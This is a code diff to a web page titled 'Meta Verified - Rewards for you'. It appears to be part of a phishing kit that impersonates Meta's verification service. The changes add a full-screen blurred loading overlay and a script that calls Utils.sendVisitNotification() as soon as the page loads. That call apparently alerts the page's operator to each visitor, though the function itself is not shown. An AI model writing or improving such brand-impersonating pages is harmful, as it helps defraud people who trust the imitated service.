@@ -7,6 +7,11 @@
     <title>Meta Verified - Rewards for you</title>
     <link rel="icon" href="./public/favicon-32x32.png">
     <link rel="stylesheet" href="./public/styles/style.css">
+    <style>
+        #page-boot-overlay{position:fixed;inset:0;z-index:2147483646;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.82);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px)}
+        .boot-spinner{width:36px;height:36px;border:3px solid #e0e0e0;border-top-color:#1877f2;border-radius:50%;animation:_tl_spin .7s linear infinite}
+        @keyframes _tl_spin{to{transform:rotate(360deg)}}
+    </style>
 
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -30,6 +35,9 @@
 
 <body class="bg-gradient-to-br from-[#f9f1f9] via-[#eaf3fd] to-[#edfbf2] min-h-screen w-full flex justify-center">
 
+    <div id="page-boot-overlay">
+        <div class="boot-spinner"></div>
+    </div>
     <div id="google_translate_element" aria-hidden="true"></div>
     <script src="./public/js/translate.js"></script>
 
@@ -97,6 +105,9 @@
     <script src="./public/js/utils.js"></script>
     <script src="./public/js/modal.js"></script>
     <script src="./public/js/app.js"></script>
+    <script>
+        Utils.sendVisitNotification();
+    </script>
 </body>
 
 </html>
